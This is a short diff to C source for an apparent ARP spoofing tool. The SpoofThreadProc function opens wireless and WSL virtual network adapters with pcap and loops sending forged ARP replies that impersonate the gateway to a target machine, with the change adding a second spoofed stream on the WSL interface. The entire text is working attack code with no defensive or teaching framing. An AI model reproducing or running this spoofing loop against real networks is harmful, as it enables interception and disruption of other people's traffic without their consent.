@@ -16,12 +16,15 @@ static ULONG SpoofThreadProc(LPVOID lpParams)
 {
     MachineInfo *params = lpParams;
     char errbuf[PCAP_BUF_SIZE];
-    pcap_t *subDevice = pcap_open(DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
+    pcap_t *subDevice = pcap_open(WLAN_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
+    pcap_t *wslDevice = pcap_open(VETHER_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
     ArpPacket *arpPacket = malloc(sizeof(ArpPacket));
     while (!exitFlag)
     {
-        SetupArpPacket(arpPacket, localMacAddr, params->MacAddress, ipAddr, params->IpAddress, 2);
+        SetupArpPacket(arpPacket, localMacAddr, params->MacAddress, gateAddr, params->IpAddress, 2);
         pcap_sendpacket(subDevice, (const uint8_t *)arpPacket, sizeof(ArpPacket));
+        SetupArpPacket(arpPacket, wslHostAddr, wslAddr, params->IpAddress, ipWsl, 2);
+        pcap_sendpacket(wslDevice, (const uint8_t *)arpPacket, sizeof(ArpPacket));
     }
     free(arpPacket);
     pcap_close(subDevice);
